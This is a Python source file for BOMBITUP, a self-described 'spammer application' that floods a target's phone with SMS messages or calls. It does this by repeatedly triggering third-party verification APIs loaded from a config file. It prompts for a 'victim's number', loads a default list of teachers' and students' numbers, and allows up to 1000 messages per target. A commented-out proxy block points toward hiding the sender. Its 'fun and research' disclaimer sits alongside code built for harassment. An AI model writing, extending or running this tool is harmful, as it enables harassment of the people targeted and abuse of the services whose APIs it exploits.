#----------------------- Importing all stufs
from time import time, sleep
#from datetime import datetime as dt
import os
from requests import get, post, request as reqt
from random import choice
import subprocess
from colored import fore as Fore, style as Style
import argparse
import sys
#from concurrent.futures import ThreadPoolExecutor, as_completed
import shutil
import string, json, re
import threading

#--------------------------------------------



class IconicDecorator(object):
    def __init__(self):
        self.PASS = Style.BLINK + Fore.GREEN + "[ ✔  ]" + Style.RESET
        self.FAIL = Style.BLINK + Fore.RED + "[ ✘ ]" + Style.RESET
        self.WARN = Style.BLINK + Fore.YELLOW + "[ ! ]" + Style.RESET
        self.HEAD = Style.BLINK + Fore.CYAN + "[ # ]" + Style.RESET
        self.CMDL = Style.BLINK + Fore.BLUE + "[ → ]" + Style.RESET
        self.STDS = "     "

class StatusDecorator(object):
    def __init__(self):
        self.PASS = Style.BLINK + Fore.GREEN + "[ SUCCESS ]" + Style.RESET
        self.FAIL = Style.BLINK + Fore.RED + "[ FAILURE ]" + Style.RESET
        self.WARN = Style.BLINK + Fore.YELLOW + "[ WARNING ]" + Style.RESET
        self.HEAD = Style.BLINK + Fore.CYAN + "[ SECTION ]" + Style.RESET
        self.CMDL = Style.BLINK + Fore.BLUE + "[ COMMAND ]" + Style.RESET
        self.STDS = "           "

class MessageDecorator(object):
    def __init__(self, attr):
        ICON = IconicDecorator()
        STAT = StatusDecorator()
        if attr == "icon":
            self.PASS = ICON.PASS
            self.FAIL = ICON.FAIL
            self.WARN = ICON.WARN
            self.HEAD = ICON.HEAD
            self.CMDL = ICON.CMDL
            self.STDS = ICON.STDS
        elif attr == "stat":
            self.PASS = STAT.PASS
            self.FAIL = STAT.FAIL
            self.WARN = STAT.WARN
            self.HEAD = STAT.HEAD
            self.CMDL = STAT.CMDL
            self.STDS = STAT.STDS

    def SuccessMessage(self, RequestMessage):
        print(self.PASS + " "  + Fore.GREEN + RequestMessage + Style.RESET)

    def FailureMessage(self, RequestMessage):
        print(self.FAIL + " "  + Fore.RED + RequestMessage + Style.RESET)

    def WarningMessage(self, RequestMessage):
        print(self.WARN + " "  + Fore.YELLOW + RequestMessage + Style.RESET)

    def SectionMessage(self, RequestMessage):
        print(self.HEAD + " " + Fore.CYAN + Style.BLINK + RequestMessage + Style.RESET)

    def CommandMessage(self, RequestMessage):
        return self.CMDL + " " + Style.RESET + Fore.BLUE + RequestMessage + Fore.GREEN

    def GeneralMessage(self, RequestMessage):
        print(self.STDS + " "  + RequestMessage + Style.RESET)

class APIProvider:

    api_providers=[]
    delay = 0
    status = True

    def __init__(self,cc,target,mode,delay=0):
        with open('apidata.json', 'r') as file:
            PROVIDERS = json.load(file)
        self.config = None
        self.cc = cc
        self.target = target
        self.mode = mode
        self.index = 0
        self.lock = threading.Lock()
        APIProvider.delay = delay
        providers=PROVIDERS.get(mode.lower(),{})
        APIProvider.api_providers = providers.get(cc,[])
        APIProvider.api_providers+=providers.get("multi",[])

    def format(self):
        config_dump = json.dumps(self.config)
        config_dump = config_dump.replace("{target}",self.target).replace("{cc}",self.cc)
        self.config = json.loads(config_dump)
        sleep(5)

    def select_api(self):
        try:
            self.index = choice(range(len(APIProvider.api_providers)))
        except IndexError:
            self.index=-1
            return
        self.config = APIProvider.api_providers[self.index]
        
        with open('.agents','rt') as file:
            readen = file.read()
            heads = readen.split('\n')
            
        perma_headers = choice(heads)
        if "headers" in self.config:
            self.config["headers"].update(perma_headers)
        else:
            self.config["headers"]=perma_headers
        self.format()

    def remove(self):
        try:
            del APIProvider.api_providers[self.index]
            return True
        except:
            return False

    def request(self):
        self.select_api()
        if not self.config or self.index==-1:
            return None
        identifier=self.config.pop("identifier","").lower()
        del self.config['name']
        self.config['timeout']=30
        del self.config['headers']
#        del self.config['method']
        response=reqt(**self.config)
        print(self.config)
        print(response)
#        return identifier in response.text.lower()
        response = int(str(response).replace('>','').replace('<Response','').replace(' ','').replace('[','').replace(']',''))
        print(response)
        sleep(5)
        if response in range(200,300):
            return True
        elif response not in range(200,300):
            return False
        else:
            return None

    def hit(self):
        try:
            if not APIProvider.status:
                return
            sleep(APIProvider.delay)
            self.lock.acquire()
            response = self.request()
            if response==False:
                self.remove()
            elif response==None:
                APIProvider.status=False
            return response
        except:
            response=False
        finally:
            self.lock.release()
            return response



def readisdc():
    with open("isdcodes.json") as file:
        isdcodes = json.load(file)
    return isdcodes

def get_version():
    try:
        return open(".version","r").read().strip()
    except:
        return '1.0'

def connected(host='https://www.google.co.in'): #Checking network connection.
    try:
        get(host, timeout=50)
        return True
    except:
        return False
    
def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
def defualtNum():
    list1 = []
    with open(file,'rt') as victims_lis:

        victim_num_lis = victims_lis.read()

        vic_lis = victim_num_lis.split('/')

        for vic_and_num in vic_lis:

            vic_and_num_lis = vic_and_num.split('\n')

            for name in vic_and_num_lis:

                if (name == 'Teachers') or (name == 'Students') or (name == ''):
                    pass
                else:
                    name = name.replace(' ', '')
                    list1.append(name.split(':')[1])
    return list1
def bann_text():
    clr()
    logo="""

██████╗  ██████╗ ███╗   ███╗██████╗ ██╗████████╗██╗   ██╗██████╗ 
██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║╚══██╔══╝██║   ██║██╔══██╗
██████╔╝██║   ██║██╔████╔██║██████╔╝██║   ██║   ██║   ██║██████╔╝
██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██║   ██║   ██║   ██║██╔═══╝ 
██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝██║   ██║   ╚██████╔╝██║     
╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚═╝   ╚═╝    ╚═════╝ ╚═╝     
                                                                 
                                         """
    version="Version: "+__VERSION__
    contributors="Contributors: "+" ".join(__CONTRIBUTORS__)
    print(choice(ALL_COLORS) + logo + RESET_ALL)
    mesgdcrt.SuccessMessage(version)
    mesgdcrt.SectionMessage(contributors)
    print()
    
def do_zip_update():
    success=False

    # Download Zip from git
    # Unzip and overwrite the current folder

    if success:
        mesgdcrt.SuccessMessage("BOMBITUP was updated to the latest version")
        mesgdcrt.GeneralMessage("Please run the script again to load the latest version")
    else:
        mesgdcrt.FailureMessage("Unable to update BOMBITUP.")
        mesgdcrt.WarningMessage("Grab The Latest one From https://github.com/Uni-Creator/BOMBITUP.git")

    sys.exit()

def do_git_update():
    success=False
    try:
        print(ALL_COLORS[0]+"UPDATING "+RESET_ALL,end='')
        process = subprocess.Popen("git checkout . && git pull ", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        while process:
            print(ALL_COLORS[0]+'.'+RESET_ALL,end='')
            sleep(1)
            returncode = process.poll()
            if returncode is not None:
                break
        success = not process.returncode
    except:
        success = False
    print("\n")

    if success:
        mesgdcrt.SuccessMessage("BOMBITUP was updated to the latest version")
        mesgdcrt.GeneralMessage("Please run the script again to load the latest version")
    else:
        mesgdcrt.FailureMessage("Unable to update BOMBITUP.")
        mesgdcrt.WarningMessage("Make Sure To Install 'git' ")
        mesgdcrt.GeneralMessage("Then run command:")
        print("git checkout . && git pull https://github.com/Uni-Creator/BOMBITUP.git HEAD")
    sys.exit()

def update():
    if shutil.which('git'):
        do_git_update()
    else:
        do_zip_update()
def check_for_updates():
    mesgdcrt.SectionMessage("Checking for updates")
    fver = get("https://raw.githubusercontent.com/Uni-Creator/BOMBITUP/master/.version").text.strip()
    if fver != __VERSION__:
        mesgdcrt.WarningMessage("An update is available")
        mesgdcrt.GeneralMessage("Starting update...")
        update()
    else:
        mesgdcrt.SuccessMessage("BOMBITUP is up-to-date")
        mesgdcrt.GeneralMessage("Starting BOMBITUP")
        
        
def check_intr():
    if connected():
        mesgdcrt.SuccessMessage('Connected to internet !')
        sleep(2)
        if sys.version_info[0]!=3:
            mesgdcrt.FailureMessage("BOMBITUP will work only in Python v3")
            sys.exit()

        try:
            country_codes = readisdc()["isdcodes"]
        except FileNotFoundError:
            update()
#        check_for_updates()
    else:
        mesgdcrt.FailureMessage("Poor internet connection detected")
#        exit()

def pretty_print(cc,target,success,failed):
    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
    mesgdcrt.GeneralMessage("Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage(f"Target       :   +{cc} {str(target)}")
    mesgdcrt.GeneralMessage(f"Sent         :   {str(failed + success)} msg")
    mesgdcrt.GeneralMessage(f"Success      :   {str(success)} msg")
    mesgdcrt.GeneralMessage(f"Failed       :   {str(failed)} msg")
    mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
    
def workernode(mode,cc,target,count):
    delay = 0
    api = APIProvider(cc,target,mode,delay=delay)
    
    clr()
    max_threads = 100
    bann_text()
    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
    mesgdcrt.GeneralMessage("Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage(f"Target        :   +{cc} {str(target)}")
    mesgdcrt.GeneralMessage(f"Amount        :   {str(count)}  msg")
#    mesgdcrt.GeneralMessage(f"Delay         :   {str(delay)}   seconds")
    mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
    print()
    input(mesgdcrt.CommandMessage("Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it"))
    

    if len(APIProvider.api_providers)==0:
        mesgdcrt.FailureMessage("Your country/target is not supported as of now")
        mesgdcrt.GeneralMessage("Feel free to reach out to us")
        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
        bann_text()
        sys.exit()

    success,failed=0,0
    while success + failed < count:
        
#        try:
        print('\nHey hit1:\n')
        result = api.hit()
        
#        print('\nHey hit2:\n')
#        print(api.hit())
#        print('\nHey result:\n')
#        print(api.request())

        sleep(3)
        if result:
#                print(result+'s')
            success+=1
        elif not result:
#                print(result+'f')
            failed+=1
    
#        except:
#            failed+=1

#-------------------------------------old method-------------------------------------
#        with ThreadPoolExecutor(max_workers=max_threads) as executor:
#            jobs = []
#            for i in range(count-success):
#                jobs.append(executor.submit(api.hit))
#
#            for job in as_completed(jobs):
#                result = job.result()
#                if result==None:
#                    mesgdcrt.FailureMessage("Bombing limit for your target has been reached")
#                    mesgdcrt.GeneralMessage("Try Again Later !!")
#                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))                   
#                    bann_text()
#                    sys.exit()
#                elif result:
#                    success+=1
#                else:
#                    failed+=1
#-------------------------------------------------------------------------------------
        clr()
        pretty_print(cc,target,success,failed)
    print("\n")
    mesgdcrt.SuccessMessage("Bombing completed!")
    sleep(1)
    bann_text()
    
def selectnode(mode):    
    mode=mode.lower().strip()
    if mode == 'mail':
        print('Coming soon!')
        exit()
    else:
        pass
    try:
        clr()
        bann_text()
        check_intr()
#        check_for_updates()
        
        while True:
            clr()
            bann_text()
            limit = 500
            cc = input(mesgdcrt.CommandMessage('Enter country code (without +): '))
            cc = cc.replace(' ','')
            if cc == '' or len(cc) not in range(2,4):
                mesgdcrt.FailureMessage('Invalid Country Code !')
                sleep(1)
            elif cc.isnumeric() and len(cc) in range(2,4):
                if cc == '91':
                    if mode == 'call':
                        limit = 200
                    else:
                        limit = 1000
                break
            else:
                mesgdcrt.FailureMessage('Invalid Country Code !')
                sleep(1)
        if cc != '91' and mode == 'call':
            mesgdcrt.WarningMessage('Oops! call mode is currently avialable only for +91')
            exit() 
        
        while True:
            clr()
            bann_text()
            confirm = input(mesgdcrt.CommandMessage('Use Default (d) or a new number (n): '))
            confirm = confirm.lower()

            if confirm == 'd':
                victimNumber = defualtNum()
                break

            elif confirm == 'n':

                while True:
                    clr()
                    bann_text()
                    victimNumber = input(mesgdcrt.CommandMessage(f"Enter victim's Number/s seperated by comma(,) +{cc}: "))
                    victimNumber = victimNumber.replace(' ','')

                    if victimNumber == '' or len(victimNumber) < 6:
                        mesgdcrt.FailureMessage('Invalid number !')
                        sleep(1)

                    elif ',' not in victimNumber and (len(victimNumber) > 12):
                        mesgdcrt.FailureMessage('Invalid number !')
                        sleep(1)
                        
                    elif cc == '91' and len(victimNumber) != 10:
                        mesgdcrt.FailureMessage('Invalid number !')
                        sleep(1)
                        
                    else:
                        break
                break

            else:
                mesgdcrt.FailureMessage(' Invalid option !')
                sleep(1)

        if victimNumber == defualtNum():
            pass
        elif len(victimNumber) in range(6,13) and victimNumber.isnumeric():
            test.append(victimNumber)
            victimNumber = test
        else:
            victimsLis = victimNumber.split(',')
            testLis1 = []
            testLis2 = victimsLis.copy()

            for num in victimsLis:

                if len(num) in range(6,13) and num.isnumeric():
                    pass

                elif (len(num) not in range(6,13)):
                    mesgdcrt.FailureMessage(f'Invalid number is present at index {victimsLis.index(num) + 1}')
                    victimsLis.remove(num)
                    mesgdcrt.SuccessMessage('Number removed !\n')
                    sleep(1)
                
        #        elif num in testLis2:
        #            print(f'[*]Duplicate number is present at index {victimsLis.index(num) + 1}')
        #            victimsLis.remove(num)
        #            print('[*]Number removed !\n')


            victimNumber = victimsLis

        
        while True:
            clr()
            bann_text()
            msgCount = input(mesgdcrt.CommandMessage(f'How many msg\\call do you want to send to the victim max {limit} : '))
            if msgCount.isnumeric():
                msgCount = int(msgCount)
                if msgCount < 1:
                    mesgdcrt.FailureMessage('Invalid value must be atleast 1')
                    mesgdcrt.SuccessMessage('Automatically capping msg count to min value (1)')
                    msgCount = 1
                    sleep(1)

                elif msgCount > limit:
                    mesgdcrt.FailureMessage(f'Invalid value max {limit}')
                    mesgdcrt.SuccessMessage(f'Automatically capping msg count to max value ({limit})')
                    msgCount = limit
                    sleep(1)

                break

            else:
                mesgdcrt.FailureMessage('Invalid value !')
                sleep(1)
#        proxies = {
#                    'http': 'socks5://139.59.53.105:1080',
#                    'https': 'socks5://139.59.53.105:8080'
#                }
#        tor = get('http://www.google.co.in', proxies=proxies).text
#        tor = (tor.replace('\n', ''))
#        print(tor)
#        print("[*]launch Tor - OK")
        
        for target in victimNumber:
            workernode(mode,cc,target,msgCount)
        
    except KeyboardInterrupt :
        print('\n')
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit()
        


mesgdcrt = MessageDecorator("icon")
__VERSION__ = get_version()
__CONTRIBUTORS__ = ['Uni-Creator']

ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
RESET_ALL = Style.RESET

description="""BOMBITUP - Your Friendly Spammer Application
BOMBITUP can be used for many purposes which incudes - 
\t Exposing the vulnerable APIs over Internet
\t Friendly Spamming
\t Testing Your Spam Detector and more ....
BOMBITUP is not intented for malicious uses.
"""

parser = argparse.ArgumentParser(description=description,epilog='Coded by Uni-Creator !!!')
parser.add_argument("-sms","--sms", action="store_true",help="start BOMBITUP with SMS Bomb mode")
parser.add_argument("-call","--call", action="store_true",help="start BOMBITUP with CALL Bomb mode")
parser.add_argument("-mail","--mail", action="store_true",help="start BOMBITUP with MAIL Bomb mode")
parser.add_argument("-u","--update", action="store_true",help="update BOMBITUP")
parser.add_argument("-c","--contributors", action="store_true",help="show current BOMBITUP contributors")
parser.add_argument("-v","--version", action="store_true",help="show current BOMBITUP version")


file = 'victims_numbers.txt'
test = []


if __name__ == "__main__":
    start = time()
    args = parser.parse_args()
    if args.version:
        print("Version: ",__VERSION__)
    elif args.contributors:
        print("Contributors: "," ".join(__CONTRIBUTORS__))
    elif args.update:
        update()
    elif args.mail:
        selectnode(mode="mail")
    elif args.call:
        selectnode(mode="call")
    elif args.sms:
        selectnode(mode="sms")
    else:
        choic=""
        avail_choic={"1":"SMS","2":"CALL ","3":"MAIL"}
        try:
            while (not choic in avail_choic):
                clr()
                bann_text()
                print("Available Options:\n")
                for key,value in avail_choic.items():
                    print(f"[ {key} ] {value} BOMB")
                print()
                choic=input(mesgdcrt.CommandMessage("Enter Choice : "))
            selectnode(mode=avail_choic[choic].lower())
        except KeyboardInterrupt : 
            print('\n')
            mesgdcrt.WarningMessage("Received INTR call - Exiting...")
            sys.exit()
    print(f'\nIt\'s took {round(time()-start)} secs to bomb the {mode}s to victim')
    sys.exit()
    